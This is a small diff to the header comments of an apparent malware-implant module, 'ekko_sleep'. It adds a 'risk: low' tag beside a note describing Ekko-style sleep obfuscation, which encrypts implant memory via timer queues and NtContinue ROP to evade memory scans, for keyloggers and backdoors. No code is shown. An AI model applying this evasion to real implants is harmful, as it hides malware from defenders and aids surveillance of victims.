@@ -2,6 +2,7 @@
 // depends: (none)
 // provides: ekko_sleep
 // headers: windows.h
+// risk: low
 // note: Ekko-style sleep obfuscation — encrypts implant memory during sleep using timer queue + ROP via NtContinue. Memory scans during sleep see encrypted non-executable bytes. For persistent payloads (keylogger, backdoor).
 
 #ifndef CHUNK_SLEEP_EKKO
